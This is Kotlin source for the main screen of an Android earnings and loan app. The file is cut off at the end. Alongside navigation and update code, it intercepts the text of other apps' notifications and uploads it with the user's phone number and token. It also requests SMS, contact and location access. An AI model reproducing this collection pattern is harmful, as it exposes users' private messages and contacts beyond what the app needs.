package com.vahan.mitra_playstore.view

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.app.Dialog
import android.content.*
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.ColorDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
import android.provider.SyncStateContract.Helpers.update
import android.text.SpannableString
import android.text.TextUtils
import android.text.style.UnderlineSpan
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.databinding.DataBindingUtil
import androidx.lifecycle.lifecycleScope
import androidx.navigation.NavController
import androidx.navigation.NavDestination
import androidx.navigation.NavOptions
import androidx.navigation.Navigation
import com.facebook.react.ReactInstanceManager
import com.facebook.react.ReactNativeHost
import com.getkeepsafe.taptargetview.TapTarget
import com.getkeepsafe.taptargetview.TapTargetSequence
import com.google.android.material.snackbar.Snackbar
import com.google.android.play.core.appupdate.AppUpdateManager
import com.google.android.play.core.appupdate.AppUpdateManagerFactory
import com.google.android.play.core.install.InstallState
import com.google.android.play.core.install.InstallStateUpdatedListener
import com.google.android.play.core.install.model.AppUpdateType
import com.google.android.play.core.install.model.InstallStatus
import com.google.android.play.core.install.model.UpdateAvailability
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import com.moe.pushlibrary.MoEHelper
import com.moengage.core.Properties
import com.vahan.mitra_playstore.BuildConfig
import com.vahan.mitra_playstore.R
import com.vahan.mitra_playstore.databinding.ActivityMainBinding
import com.vahan.mitra_playstore.models.*
import com.vahan.mitra_playstore.services.LocationService
import com.vahan.mitra_playstore.utils.Constants
import com.vahan.mitra_playstore.utils.PrefrenceUtils
import com.vahan.mitra_playstore.utils.captureAllEvents
import com.vahan.mitra_playstore.view.activities.enternumberactivity.view.ui.EnterNumberActivity
import com.vahan.mitra_playstore.workmanager.WorkerScheduler
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*

@AndroidEntryPoint
class MainActivity : BaseActivity(), CoroutineScope by MainScope() {
    // var coachmarkListener: CoachmarkListener? = null
    private var _binding: ActivityMainBinding? = null
    private val binding get() = _binding!!
    private var gettingTextFromNotification: GettingTextFromNotification? = null
    private var db: FirebaseFirestore? = null
    private val MyContactRequestCode = 1
    private var navController: NavController? = null
    private var isSms = false
    private var isReadContact = false
    private var DAYS_FOR_FLEXIBLE_UPDATE = 7

    private var closePopup = false
    private var isReadContactAvail = false
    private var isInstalledAppAvail = false
    val handler = Handler(Looper.getMainLooper())
    private var installedApp = LinkedHashMap<String, String>()
    private val smsInfo: LinkedHashMap<String, HashMap<String, String>> = LinkedHashMap()
    private val listOfNotification: MutableList<LocalInfoMessNotiModel> = ArrayList()
    private val listOfAppInstall: MutableList<LocalInfoAppInstallModel> = ArrayList()
    private val listOfAllContacts: MutableList<LocalInfoContactsModel> = ArrayList()
    private val listOfAllSMS: MutableList<LocaInfoSMSModel> = ArrayList()
    private var readContacts = LinkedHashMap<String, String>()
    private val dataSMS: LinkedHashMap<String, HashMap<String, HashMap<String, String>>> =
        LinkedHashMap()
    private val dataNotification: HashMap<String, List<LocalInfoMessNotiModel>> =
        HashMap()
    private val dataSmsCollection: HashMap<String, List<LocaInfoSMSModel>> =
        HashMap()
    private val dataAppInstallColletion: HashMap<String, List<LocalInfoAppInstallModel>> =
        HashMap()
    private val dataAllContactsColletion: HashMap<String, List<LocalInfoContactsModel>> =
        HashMap()
    var isBackFromUpload = false
    var isActivityCoachMarkShown = false
    private var broadcastReceiver: BroadcastReceiver? = null
    private lateinit var updateAvailableConditionsModel: UpdateAvailableConditions
    private var fa: FirebaseAnalytics? = null
    private var forceCheck: Int = 1
    private var checkSmsCount = 2000

    @JvmField
    var loanStatusCheck = ""
    private val APP_UPDATE_REQUEST_CODE = 1991

    private val appUpdateManager: AppUpdateManager by lazy { AppUpdateManagerFactory.create(this) }
    private val appUpdatedListener: InstallStateUpdatedListener by lazy {
        object : InstallStateUpdatedListener {
            override fun onStateUpdate(installState: InstallState) {
                when {
                    installState.installStatus() == InstallStatus.DOWNLOADED -> popupSnackbarForCompleteUpdate()
                    installState.installStatus() == InstallStatus.INSTALLED -> appUpdateManager.unregisterListener(
                        this
                    )
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = DataBindingUtil.setContentView(this, R.layout.activity_main)
//        Thread.setDefaultUncaughtExceptionHandler(
//            ExceptionHandlingActivity(
//                this@MainActivity,
//                this
//            )
//        )
        //  coachmarkListener = context as CoachmarkListener

        fa = FirebaseAnalytics.getInstance(this)
        if (intent.getBooleanExtra(Constants.CRASH, false)) {
        }
        navController = Navigation.findNavController(this, R.id.nav_fragment_container)
        db = FirebaseFirestore.getInstance()
        gettingTextFromNotification()
        openFragmentAccordingToNotification()
        checkForRemoteConfigPermission()
        getDataForUpdate()
        clickListener()
        val permissionLocation =
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
        if (permissionLocation == PackageManager.PERMISSION_GRANTED) {
            val intent = Intent(this, LocationService::class.java)
            startService(intent)
        }
    }


        private fun checkSession(updateAvailableConditionsModel: UpdateAvailableConditions) {
            if (PrefrenceUtils.retriveDataInBoolean(this, Constants.CHECKFORFIRSTTIME)) {
                Constants.checkSessionSoftUpdate = false

            } else {
                checkForAutoUpdate(updateAvailableConditionsModel)
            }

        }

        private fun checkForAutoUpdate(dataModel: UpdateAvailableConditions) {
            if (updateAvailableConditionsModel.forceUpdateVersion!! > BuildConfig.VERSION_NAME.toDouble()) {
                if (PrefrenceUtils.retriveDataInBoolean(this, Constants.TEST_USER)) {
                    if (updateAvailableConditionsModel.forceUpdate == 1) {
                        update(false)
                    }
                } else {
                    if (updateAvailableConditionsModel.forceUpdate == 1) {
                        update(false)
                    }
                }

            }
        }

        private fun update(cancellable: Boolean) {
            val bundle = Bundle()
            fa!!.logEvent(Constants.UPDATE_NOTIFICATION_VIEWED, bundle)
            val properties = Properties()
            MoEHelper.getInstance(this)
                .trackEvent(Constants.UPDATE_NOTIFICATION_VIEWED, properties)
            val ctDialog = Dialog(this)
            ctDialog.window!!.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
            ctDialog.setContentView(R.layout.force_update_layout)
            ctDialog.findViewById<View>(R.id.btn_download).setOnClickListener {
                appUpdateManager
                    .appUpdateInfo
                    .addOnSuccessListener { appUpdateInfo ->
                        // If the update is downloaded but not installed,
                        // notify the user to complete the update.
                        if (appUpdateInfo.installStatus() == InstallStatus.DOWNLOADED) {
                            popupSnackbarForCompleteUpdate()
                        }

                        //Check if Immediate update is required
                        try {
                            if (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE) {
                                // If an in-app update is already running, resume the update.
                                appUpdateManager.startUpdateFlowForResult(
                                    appUpdateInfo,
                                    AppUpdateType.IMMEDIATE,
                                    this,
                                    APP_UPDATE_REQUEST_CODE
                                )
                            } else {
                                Toast.makeText(
                                    this, getString(R.string.failure)
                                            + it, Toast.LENGTH_LONG
                                ).show()
                            }
                        } catch (e: IntentSender.SendIntentException) {
                            e.printStackTrace()
                        }
                    }.addOnFailureListener {
                        Toast.makeText(
                            this, getString(R.string.failure)
                                    + it, Toast.LENGTH_LONG
                        ).show()
                    }
            }
            ctDialog.setCanceledOnTouchOutside(cancellable)
            ctDialog.setCancelable(cancellable)
            ctDialog.show()
        }

        private fun getDataForUpdate() {
            updateAvailableConditionsModel = Gson()
                .fromJson(
                    PrefrenceUtils.retriveData(
                        this,
                        Constants.UPDATE_CONDITIONS_REMOTE_CONFIG
                    ),
                    UpdateAvailableConditions::class.java
                )
            forceCheck = updateAvailableConditionsModel.forceUpdate!!
            checkSession(updateAvailableConditionsModel)

            // logout user after app update
            if (!PrefrenceUtils.retriveDataInBooleanIsUpdate(
                    this,
                    Constants.CHECKFORVERSIONUPDATE
                )
            ) {
                if (isFirstInstall(this)) {
                } else {
                    startActivity(Intent(this, EnterNumberActivity::class.java))
                    finishAffinity()
                    PrefrenceUtils.insertDataInBooleanIsUpdate(
                        this,
                        Constants.CHECKFORVERSIONUPDATE,
                        true
                    )
                }
            }
        }

        fun startCoachMarks() {
            binding.borrowBottomIcon.setColorFilter(
                ContextCompat.getColor(this, R.color.default_200),
                android.graphics.PorterDuff.Mode.SRC_IN
            )
            val sequence: TapTargetSequence = TapTargetSequence(this)
                .targets(
                    TapTarget.forView(
                        binding.llHomeTab,
                        resources.getString(R.string.home_tab_coach_mark_desc)
                    )
                        .outerCircleColor(R.color.default_200) // Specify a color for the outer circle
                        .outerCircleAlpha(0.9f) // Specify the alpha amount for the outer circle
                        .targetCircleColor(com.vahan.mitra_playstore.R.color.white) // Specify a color for the target circle
                        .titleTextSize(16) // Specify the size (in sp) of the title text
                        .titleTextColor(R.color.white) // Specify the color of the title text
                        .descriptionTextSize(16) // Specify the size (in sp) of the description text
                        .descriptionTextColor(R.color.red) // Specify the color of the description text
                        .textColor(R.color.white) // Specify a color for both the title and description text
                        .textTypeface(Typeface.DEFAULT_BOLD) // Specify a typeface for the text
                        .dimColor(R.color.black) // If set, will dim behind the view with 30% opacity of the given color
                        .drawShadow(true) // Whether to draw a drop shadow or not
                        .cancelable(false) // Whether tapping outside the outer circle dismisses the view
                        .tintTarget(false) // Whether to tint the target view's color
                        .transparentTarget(true) // Specify whether the target is transparent (displays the content underneath) // Specify a custom drawable to draw as the target
                        .targetRadius(50)
                        .id(1),
                    TapTarget.forView(
                        binding.bottomEarningsIcon,
                        resources.getString(R.string.earnings_tab_coach_mark_desc)
                    )
                        .outerCircleColor(R.color.default_200) // Specify a color for the outer circle
                        .outerCircleAlpha(0.9f) // Specify the alpha amount for the outer circle
                        .targetCircleColor(com.vahan.mitra_playstore.R.color.white) // Specify a color for the target circle
                        .titleTextSize(16) // Specify the size (in sp) of the title text
                        .titleTextColor(R.color.white) // Specify the color of the title text
                        .descriptionTextSize(16) // Specify the size (in sp) of the description text
                        .descriptionTextColor(R.color.red) // Specify the color of the description text
                        .textColor(R.color.white) // Specify a color for both the title and description text
                        .textTypeface(Typeface.DEFAULT_BOLD) // Specify a typeface for the text
                        .dimColor(R.color.black) // If set, will dim behind the view with 30% opacity of the given color
                        .drawShadow(true) // Whether to draw a drop shadow or not
                        .cancelable(false) // Whether tapping outside the outer circle dismisses the view
                        .tintTarget(false) // Whether to tint the target view's color
                        .transparentTarget(true) // Specify whether the target is transparent (displays the content underneath) // Specify a custom drawable to draw as the target
                        .targetRadius(50)
                        .id(2)
                )
                .listener(object : TapTargetSequence.Listener {
                    // This listener will tell us when interesting(tm) events happen in regards
                    // to the sequence
                    override fun onSequenceFinish() {
                        //      PrefrenceUtils.insertDataInBoolean(context, Constants.ACTIVITY_COACHMARKS, true)
                        //     coachmarkListener?.coachmarkCallback()
                        PrefrenceUtils.insertDataInBoolean(
                            context,
                            Constants.CHECKFORFIRSTTIME,
                            false
                        )

                    }

                    override fun onSequenceStep(lastTarget: TapTarget, targetClicked: Boolean) {
                        Log.d("TapTargetView", "Clicked on " + lastTarget.id())
                    }

                    override fun onSequenceCanceled(lastTarget: TapTarget) {
//                    val dialog = AlertDialog.Builder(requireContext())
//                        .setTitle("Uh oh")
//                        .setMessage("You canceled the sequence")
//                        .setPositiveButton("Oops", null).show()
//                    TapTargetView.showFor(dialog,
//                        TapTarget.forView(dialog.getButton(DialogInterface.BUTTON_POSITIVE),
//                            "Uh oh!",
//                            "You canceled the sequence at step " + lastTarget.id())
//                            .cancelable(false)
//                            .tintTarget(false), object : TapTargetView.Listener() {
//                            override fun onTargetClick(view: TapTargetView) {
//                                super.onTargetClick(view)
//                                dialog.dismiss()
//                            }
//                        })
                    }
                })

            // You don't always need a sequence, and for that there's a single time tap target

            // You don't always need a sequence, and for that there's a single time tap target
            val spannedDesc = SpannableString("This is the sample app for TapTargetView")
            spannedDesc.setSpan(
                UnderlineSpan(),
                spannedDesc.length - "TapTargetView".length,
                spannedDesc.length,
                0
            )

            sequence.start()

        }

        private fun clickListener() {
            binding.bottomHomeContainer.setOnClickListener {
                setFragment(
                    Constants.HOME_FRAGMENT, 0
                )
            }
            binding.bottomEarningsIcon.setOnClickListener {
                val properties = Properties()
                val attribute = HashMap<String, Any>()
                captureAllEvents(this, Constants.WEEKLY_PAGE_PAYOUT_CLICKED, attribute, properties)
                setFragment(
                    Constants.WEEKLY_EARNINGS_FRAGMENT, 1
                )
            }
            binding.earningsBottomIcon.setOnClickListener {
                setFragment(
                    Constants.WEEKLY_EARNINGS_FRAGMENT, 1
                )
            }

        }

        private fun openFragmentAccordingToNotification() {
            if (intent.hasExtra(Constants.TYPE)) {
                openingFragmentAccordingTwoType(intent.getStringExtra(Constants.TYPE))
            } else if (intent.hasExtra("Navigation")) {
                binding.tvHomeBottom.setTextColor(getColor(R.color.text_heading))
                binding.homeBottomIcon.setBackgroundResource(R.drawable.ic_home_highlight)
                binding.vIconHome.visibility = View.VISIBLE
                binding.bottomHomeContainer.isEnabled = false
                binding.bottomEarningsIcon.isEnabled = true
//            binding.bottomNavigation.visibility = View.GONE
                val navString = intent.getStringExtra("Navigation")
                if (intent.getStringExtra("Navigation") == Constants.UPLOAD) {
                    val bundle = Bundle()
                    bundle.putString("nav", "Navigation")
                    val navBuilder = NavOptions.Builder()
                    navBuilder.setEnterAnim(R.anim.enter_animation)
                        .setExitAnim(R.anim.exit_animation)
                        .setPopEnterAnim(R.anim.enter_animation)
                        .setPopExitAnim(R.anim.exit_animation)
                    navController!!.navigate(R.id.nav_upload_fragment, bundle, navBuilder.build())
                } else if (intent.getStringExtra("Navigation") == Constants.VERIFYBANK) {
                    val bundle = Bundle()
                    bundle.putString("nav", "Navigation")
                    val navBuilder = NavOptions.Builder()
                    navBuilder.setEnterAnim(R.anim.enter_animation)
                        .setExitAnim(R.anim.exit_animation)
                        .setPopEnterAnim(R.anim.enter_animation)
                        .setPopExitAnim(R.anim.exit_animation)
                    navController!!.navigate(R.id.nav_fragment_add, bundle, navBuilder.build())
                } else if (intent.getStringExtra("Navigation") == Constants.PROFILE_PIC || intent.getStringExtra(
                        "Navigation"
                    ) == Constants.BANK_DOC_UPLOAD
                ) {
                    val bundle = Bundle()
                    bundle.putString("nav", "Navigation")
                    if (intent.getStringExtra("Navigation") == Constants.PROFILE_PIC)
                        bundle.putString("type", Constants.PROFILE_PIC)
                    else
                        bundle.putString("type", Constants.BANK_DOC_UPLOAD)
                    val navBuilder = NavOptions.Builder()
                    navBuilder.setEnterAnim(R.anim.enter_animation)
                        .setExitAnim(R.anim.exit_animation)
                        .setPopEnterAnim(R.anim.enter_animation)
                        .setPopExitAnim(R.anim.exit_animation)
                    binding.bottomNavigation.visibility = View.GONE
                    navController!!.navigate(
                        R.id.nav_fragment_generic_image_mode,
                        bundle,
                        navBuilder.build()
                    )
                }
            } else {
                defaultFragmentOpen()
            }
        }

        private fun gettingTextFromNotification() {
            gettingTextFromNotification = GettingTextFromNotification()
            val intentFilter = IntentFilter()
            intentFilter.addAction(getString(R.string.freshchat_file_provider_authority))
            registerReceiver(gettingTextFromNotification, intentFilter)
        }

        private fun defaultFragmentOpen() {
            navController!!.addOnDestinationChangedListener { _: NavController?, destination: NavDestination, _: Bundle? ->
                Log.d("test", destination.id.toString() + " " + R.id.nav_upload_fragment)
                when (destination.id) {
                    R.id.nav_home_fragment -> {
                        binding.bottomNavigation.visibility = View.VISIBLE
                        defaultIconLoads()
                    }
                    R.id.nav_upload_fragment -> {
                        bottomNavSelect(0)
                        if (R.id.nav_fragment_payment_sucessful == destination.id) {
                            binding.bottomNavigation.visibility = View.GONE
                        } else if (R.id.nav_upload_fragment == destination.id || R.id.nav_view_fragment == destination.id) {
                            if (intent.hasExtra("Navigation"))
                                binding.bottomNavigation.visibility = View.GONE
                        } else if (R.id.nav_error_fragment == destination.id) {
                            bottomNavSelect(0)
                            if (intent.hasExtra("Navigation"))
                                binding.bottomNavigation.visibility = View.GONE
                        } else {
                            binding.bottomNavigation.visibility = View.VISIBLE
                        }
                    }
                    R.id.nav_fragment_add -> {
                        bottomNavSelect(0)
                        if (R.id.nav_fragment_add == destination.id) {
                            if (intent.hasExtra("Navigation"))
                                binding.bottomNavigation.visibility = View.GONE
                        }
                    }
                    R.id.nav_fragment_addBank_view -> {
                        bottomNavSelect(0)
                        if (R.id.nav_fragment_addBank_view == destination.id) {
                            if (intent.hasExtra("Navigation"))
                                binding.bottomNavigation.visibility = View.GONE
                        }
                    }

                    R.id.nav_fragment_generic_image_mode -> {
                        bottomNavSelect(0)
                        if (R.id.nav_fragment_generic_image_mode == destination.id) {
                            if (intent.hasExtra("Navigation"))
                                binding.bottomNavigation.visibility = View.GONE
                        }
                    }

                    else -> {
                        when (destination.id) {
                            R.id.weekly_earnings_fragment -> {
                                bottomNavSelect(1)
                            }
                            R.id.nav_profile_fragment -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_borrow_fragment -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_insurance_fragment -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_upload_fragment -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_view_upload -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_view_fragment -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_fragment_addBank_view -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_fragment_add -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_loan_application_fragment -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_loan_result_fragment -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_loan_tenure_fragment -> {
                                bottomNavSelect(0)
                            }
                            R.id.nav_referral_home_fragment -> {
                                bottomNavSelect(0)
                            }
                            else -> {
                                bottomNavSelect(0)
                            }
                        }
                        if (R.id.nav_fragment_payment_sucessful == destination.id) {
                            binding.bottomNavigation.visibility = View.GONE
                        } else if (R.id.nav_upload_fragment == destination.id || R.id.nav_view_fragment == destination.id) {
                            bottomNavSelect(0)
                            if (intent.hasExtra("Navigation"))
                                binding.bottomNavigation.visibility = View.GONE
                        } else if (R.id.nav_referral_rsp_status_fragment == destination.id) {
                            binding.bottomNavigation.visibility = View.GONE
                        } else if (R.id.nav_error_fragment == destination.id) {
                            bottomNavSelect(0)
                            if (intent.hasExtra("Navigation"))
                                binding.bottomNavigation.visibility = View.GONE
                        } else if (R.id.nav_fragment_add == destination.id) {
                            bottomNavSelect(0)
                            if (intent.hasExtra("Navigation"))
                                binding.bottomNavigation.visibility = View.GONE
                        } else {
                            binding.bottomNavigation.visibility = View.VISIBLE
                        }
                    }
                }
            }
        }

        fun updateIconAsPerCoachMarks(type: Int) {
            when (type) {
                0 -> {
                    binding.bottomProductIcon.visibility = View.INVISIBLE
                    binding.profileContainer.visibility = View.VISIBLE
                    binding.statsIcon.visibility = View.VISIBLE
                }
                1 -> {
                    binding.bottomProductIcon.visibility = View.VISIBLE
                    binding.profileContainer.visibility = View.VISIBLE
                    binding.statsIcon.visibility = View.INVISIBLE
                }
                2 -> {
                    binding.bottomProductIcon.visibility = View.VISIBLE
                    binding.profileContainer.visibility = View.INVISIBLE
                    binding.statsIcon.visibility = View.VISIBLE
                }

                else -> {
                    binding.bottomProductIcon.visibility = View.VISIBLE
                    binding.profileContainer.visibility = View.VISIBLE
                    binding.statsIcon.visibility = View.VISIBLE
                }
            }
        }

        private fun bottomNavSelect(type: Int) {
            binding.homeBottomIcon.setBackgroundResource(R.drawable.ic_home_added)
            binding.tvHomeBottom.setTextColor(getColor(R.color.black_color))
            binding.earningsBottomIcon.setBackgroundResource(R.drawable.ic_earning_light)
            binding.tvEarningsBottom.setTextColor(getColor(R.color.black_color))
            binding.vIconHome.visibility = View.GONE
            binding.vIconEarnings.visibility = View.GONE
            when (type) {
                0 -> {
                    binding.tvHomeBottom.setTextColor(getColor(R.color.text_heading))
                    binding.homeBottomIcon.setBackgroundResource(R.drawable.ic_home_highlight)
                    binding.vIconHome.visibility = View.VISIBLE
                    binding.vIconEarnings.visibility = View.GONE
                    binding.bottomHomeContainer.isEnabled = false
                    binding.bottomEarningsIcon.isEnabled = true
                }
                1 -> {
                    binding.tvEarningsBottom.setTextColor(getColor(R.color.text_heading))
                    binding.earningsBottomIcon.setBackgroundResource(R.drawable.ic_earning)
                    binding.bottomHomeContainer.isEnabled = true
                    binding.bottomEarningsIcon.isEnabled = false
                    binding.vIconEarnings.visibility = View.VISIBLE
                    binding.vIconHome.visibility = View.GONE
                }

            }
        }

        private fun defaultIconLoads() {
            binding.homeBottomIcon.setBackgroundResource(R.drawable.ic_home_added)
            binding.tvHomeBottom.setTextColor(getColor(R.color.black_color))
            binding.earningsBottomIcon.setBackgroundResource(R.drawable.ic_earning_light)
            binding.tvEarningsBottom.setTextColor(getColor(R.color.black_color))
            binding.vIconHome.visibility = View.GONE
            binding.vIconHome.visibility = View.GONE
            binding.tvHomeBottom.setTextColor(getColor(R.color.text_heading))
            binding.homeBottomIcon.setBackgroundResource(R.drawable.ic_home_highlight)
            binding.vIconHome.visibility = View.VISIBLE
            binding.bottomHomeContainer.isEnabled = false
            binding.earningsBottomIcon.isEnabled = true
        }

        override fun onBackPressed() {
            when (val destination = navController!!.currentDestination!!.id) {
                R.id.nav_home_fragment -> {}
                R.id.nav_upload_fragment -> if (isBackFromUpload) {
                    isBackFromUpload = false
                    if (intent.hasExtra("Navigation")) {
                        startActivity(
                            Intent(
                                this,
                                HomeActivity::class.java
                            ).putExtra("link", Constants.REDIRECTION_URL)
                        )
                    } else {
                        androidx.appcompat.app.AlertDialog.Builder(this)
                            .setTitle(R.string.reminder_string)
                            .setMessage(R.string.reminder_substring)
                            .setPositiveButton(R.string.ok) { _: DialogInterface?, _: Int ->
                                Constants.checkRefreshAccount = true
                                super@MainActivity.onBackPressed()
                            }.setCancelable(false).show()
                    }
                } else if (intent.hasExtra("Navigation")) {
                    startActivity(
                        Intent(
                            this,
                            HomeActivity::class.java
                        ).putExtra("link", Constants.REDIRECTION_URL)
                    )
                } else {
                    super@MainActivity.onBackPressed()
                }
                else -> {
                    when (destination) {
                        R.id.nav_profile_fragment -> {
                            bottomNavSelect(0)
                        }
                        R.id.nav_borrow_fragment -> {
                            bottomNavSelect(0)
                        }
                        R.id.nav_insurance_fragment -> {
                            bottomNavSelect(0)
                        }
                        R.id.nav_referral_home_fragment -> {
                            bottomNavSelect(0)
                        }
                        else -> {
                            bottomNavSelect(0)
                        }
                    }
                    navController!!.popBackStack()
                }
            }
        }

        private fun checkForRemoteConfigPermission() {
            //Model Parsing and fetching values...
            if (PrefrenceUtils.retriveDataInBoolean(this, Constants.CHECKFORFIRSTTIME)) {
            }
            // logic needs to update...
            else {
                //webModel.sms == "1"
                takePermissions()
                if (!PrefrenceUtils.retriveDataInBoolean(this, Constants.NOTIFICATION_ASKED)) {
                    PrefrenceUtils.insertDataInBoolean(this, Constants.NOTIFICATION_ASKED, true)
                    val enableNotificationListenerAlertDialog =
                        buildNotificationServiceAlertDialog()
                    enableNotificationListenerAlertDialog.show()
                }
            }
        }

        private fun openingFragmentAccordingTwoType(type: String?) {
            when {
                type.equals(Constants.HOME, ignoreCase = true) -> {
                    setFragment(Constants.HOME_FRAGMENT, 0)
                }
                type.equals(Constants.BORROW, ignoreCase = true) -> {
                    setFragment(Constants.LOAN_BORROW_FRAGMENT, 1)
                }
                type.equals(Constants.LANDINGURL_REFERRAL, ignoreCase = true) -> {
                    setFragment(Constants.REFERRAL_HOME, 5)
                }
                else -> {
                    defaultFragmentOpen()
                }
            }
        }

        fun setFragment(selectedFragment: String, position: Int) {
            binding.homeBottomIcon.setBackgroundResource(R.drawable.ic_home_added)
            binding.tvHomeBottom.setTextColor(getColor(R.color.black_color))
            binding.vIconHome.visibility = View.GONE
            binding.vIconEarnings.visibility = View.GONE
            when (position) {
                0 -> {
                    binding.tvEarningsBottom.setTextColor(getColor(R.color.black_color))
                    binding.earningsBottomIcon.setBackgroundResource(R.drawable.ic_earning_light)
                    binding.tvHomeBottom.setTextColor(getColor(R.color.text_heading))
                    binding.homeBottomIcon.setBackgroundResource(R.drawable.ic_home_highlight)
                    binding.vIconHome.visibility = View.VISIBLE
                    binding.vIconEarnings.visibility = View.GONE
                    binding.bottomHomeContainer.isEnabled = false
                    binding.bottomEarningsIcon.isEnabled = true
                    binding.bottomNavigation.visibility = View.VISIBLE
                    val navBuilder = NavOptions.Builder()
                    navBuilder.setEnterAnim(R.anim.enter_animation)
                        .setExitAnim(R.anim.exit_animation)
                        .setPopEnterAnim(R.anim.enter_animation)
                        .setPopExitAnim(R.anim.exit_animation)
                    navController!!.navigate(R.id.nav_home_fragment, null, navBuilder.build())
                }
                1 -> {
                    binding.tvEarningsBottom.setTextColor(getColor(R.color.text_heading))
                    binding.earningsBottomIcon.setBackgroundResource(R.drawable.ic_earning)
                    binding.homeBottomIcon.setBackgroundResource(R.drawable.ic_home_added)
                    binding.tvHomeBottom.setTextColor(getColor(R.color.black_color))
                    binding.bottomHomeContainer.isEnabled = true
                    binding.bottomEarningsIcon.isEnabled = false
                    binding.vIconEarnings.visibility = View.VISIBLE
                    binding.vIconHome.visibility = View.GONE
                    binding.bottomNavigation.visibility = View.VISIBLE
                    val navBuilder = NavOptions.Builder()
                    navBuilder.setEnterAnim(R.anim.enter_animation)
                        .setExitAnim(R.anim.exit_animation)
                        .setPopEnterAnim(R.anim.enter_animation)
                        .setPopExitAnim(R.anim.exit_animation)
                    navController!!.navigate(
                        R.id.weekly_earnings_fragment,
                        null,
                        navBuilder.build()
                    )
                }
                5 -> {
                    binding.tvEarningsBottom.setTextColor(getColor(R.color.text_heading))
                    binding.earningsBottomIcon.setBackgroundResource(R.drawable.ic_earning)
                    binding.homeBottomIcon.setBackgroundResource(R.drawable.ic_home_added)
                    binding.tvHomeBottom.setTextColor(getColor(R.color.black_color))
                    binding.bottomHomeContainer.isEnabled = true
                    binding.bottomEarningsIcon.isEnabled = false
                    binding.vIconEarnings.visibility = View.VISIBLE
                    binding.vIconHome.visibility = View.GONE
                    binding.bottomNavigation.visibility = View.VISIBLE
                    val navBuilder = NavOptions.Builder()
                    navBuilder.setEnterAnim(R.anim.enter_animation)
                        .setExitAnim(R.anim.exit_animation)
                        .setPopEnterAnim(R.anim.enter_animation)
                        .setPopExitAnim(R.anim.exit_animation)
                    navController!!.navigate(
                        R.id.nav_referral_home_fragment,
                        null,
                        navBuilder.build()
                    )
                }
            }
        }


        override fun onDestroy() {
            super.onDestroy()
            unregisterReceiver(gettingTextFromNotification)
            if (broadcastReceiver != null) {
                unregisterReceiver(broadcastReceiver)
            }
            cancel()
        }

        @SuppressLint("NewApi")
        fun changeInterceptedNotificationImage(
            receivedNotificationPackage: String?,
            receivedNotificationMessage: String?,
        ) {
            val timestamp = createAt(System.currentTimeMillis())
            Log.d(
                "NotificationStorage",
                "changeInterceptedNotificationImage: $receivedNotificationPackage$receivedNotificationMessage"
            )

            // API CALL
            if (isNotificationServiceEnabled && (receivedNotificationMessage != null && receivedNotificationPackage != null)) {
                WorkerScheduler.updateUserNotification(
                    this@MainActivity,
                    PrefrenceUtils.retriveData(this@MainActivity, Constants.PHONENUMBER),
                    PrefrenceUtils.retriveData(this@MainActivity, Constants.API_TOKEN),
                    receivedNotificationMessage,
                    receivedNotificationPackage,
                    timestamp
                )
            }
        }

        //check for notification enabled
        private val isNotificationServiceEnabled: Boolean
        get() {
            val pkgName = packageName
            val flat = Settings.Secure.getString(
                contentResolver,
                ENABLED_NOTIFICATION_LISTENERS
            )
            if (!TextUtils.isEmpty(flat)) {
                val names = flat.split(getString(R.string.column).toRegex()).toTypedArray()
                for (i in names.indices) {
                    val cn = ComponentName.unflattenFromString(names[i])
                    if (cn != null) {
                        if (TextUtils.equals(pkgName, cn.packageName)) {
                            return true
                        }
                    }
                }
            }
            return false
        }

        //show Notification_Dialogue
        private fun buildNotificationServiceAlertDialog(): AlertDialog {
            val alertDialogBuilder = AlertDialog.Builder(this)
            alertDialogBuilder.setTitle(R.string.notification_access)
            alertDialogBuilder.setMessage(R.string.notification_access_substring)
            alertDialogBuilder.setPositiveButton(R.string.allow) { _: DialogInterface?, _: Int ->
                startActivity(
                    Intent(
                        ACTION_NOTIFICATION_LISTENER_SETTINGS
                    )
                )
            }
            alertDialogBuilder.setNegativeButton(R.string.deny) { dialog: DialogInterface?, id: Int -> }
            return alertDialogBuilder.create()
        }


        inner class GettingTextFromNotification : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                val receivedNotificationPackage =
                    intent.getStringExtra(Constants.NOTIFICATION_CODE_PACKAGE)
                val receivedNotificationMessage =
                    intent.getStringExtra(Constants.NOTIFICATION_CODE_MESSAGE)
                changeInterceptedNotificationImage(
                    receivedNotificationPackage,
                    receivedNotificationMessage
                )
            }
        }

        private fun takePermissions() {
            // No need to pass runtime permission directly
            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.ACCESS_FINE_LOCATION,
